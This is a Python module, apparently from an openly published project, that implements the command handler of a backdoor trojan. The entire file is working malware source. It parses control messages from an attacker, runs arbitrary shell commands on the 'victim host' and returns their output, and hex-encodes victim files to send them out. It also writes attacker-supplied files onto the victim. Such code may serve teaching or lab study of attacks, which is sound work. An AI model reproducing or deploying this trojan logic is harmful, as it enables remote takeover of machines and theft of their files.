#-----------------------------------------------------------------------------
# Name:        backdoorTrojanMgr.py
#
# Purpose:     This module is used to provide different function for the trojan
#              
# Author:      Yuancheng Liu
#
# Created:     2010/10/26
# Version:     v0.1.2
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License  
#-----------------------------------------------------------------------------

import os
import subprocess
import backdoorTrojanGlobal as gv

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class FuncManager(object):
    
    def __init__(self, parent) -> None:
        self.parent = parent

    #-----------------------------------------------------------------------------
    def parseIncomeMsg(self, msg):
        """ Split the trojan connection's control cmd to:
            - reqKey: request key which idenfiy the action category.
            - reqType: request type which detail action type.
            - reqData: request data which will be used in the action.
        """
        reqKey = reqType = reqData = None
        try:
            if isinstance(msg, bytes): msg = msg.decode(gv.STR_DECODE)
            reqKey, reqType, reqData = msg.split(';', 2)
            return (reqKey.strip(), reqType.strip(), reqData)
        except Exception as err:
            print('The incoming message format is incorrect, ignore it.')
            if gv.DEBUG_FLG: print(err)
            return (reqKey, reqType, reqData)
        
    #-----------------------------------------------------------------------------
    def base64Convert(self, data, b64Encode=True):
        """ Encode/decode a str to its base-64 string format.
        Args:
            messageStr (str): can be either base-64 message or plain text message.
            b64Encode (bool): whether the input is to be encoded to base-64, default True.
        Returns:
            string: base-64 message if b64Encode is True; else plain text message.
        """
        import base64
        if b64Encode:
            message_bytes = data.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')
            return base64_message
        else:
            base64_bytes = data.encode('ascii')
            message_bytes = base64.b64decode(base64_bytes)
            message = message_bytes.decode('ascii')
            return message

    #-----------------------------------------------------------------------------
    def runCmd(self, returnType, cmdStr):
        """ Run a command and collect the result on the victim host.
        Args:
            returnType (str): if == 'detail' return the command execution result, 
                        else return execution success/fail
            cmdStr (str):  command string.
        """
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                return result if returnType == 'detail' else 'success'
            except Exception as err:
                if gv.DEBUG_FLG: print("Rum cmd error: %s" %str(err))
                return str(err) if returnType == 'detail' else 'fail'
        else:
            return 'error'
        
    #-----------------------------------------------------------------------------
    def fileIO(self, actionType, data):
        """ File transfer in/out function."""
        if actionType == 'out':
            filePath = data
            if gv.DEBUG_FLG: print("Transfer victim's file out : %s" %str(filePath))
            return self._copyFileOut(filePath)
        else:
            filename = actionType
            filedata = data
            filePath = os.path.join(gv.DIR_PATH, filename)
            if gv.DEBUG_FLG: print("Create the file in victim: %s " %str(filePath))
            return self._copyFileIn(filePath, filedata)

    #-----------------------------------------------------------------------------
    def _copyFileIn(self, filePath, fileData):
        """ Copy file from attacker to victim.
        Args:
            filePath (_type_): victim file path
            fileData (_type_): file data (hex string).
        """
        fileBytes = bytes.fromhex(fileData)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(fileBytes)
            return 'done'
        except Exception as err:
            if gv.DEBUG_FLG: print("File creation error: %s" %str(err))
            return 'error'

    #-----------------------------------------------------------------------------
    def _copyFileOut(self, filePath):
        """ Copy file from victim to attacker
        Args:
            filePath (_type_): victim file path.
        """
        fileData = b'error'
        if os.path.exists(filePath):
            try:
                with open(filePath, 'rb') as fh:
                    fileData = fh.read()
                dataStr = fileData.hex()
                return dataStr
            except Exception as err:
                print("File read error: %s" %str(err))
        if gv.DEBUG_FLG: print("Transfer file not found: %s" %str(filePath))
        return fileData.hex()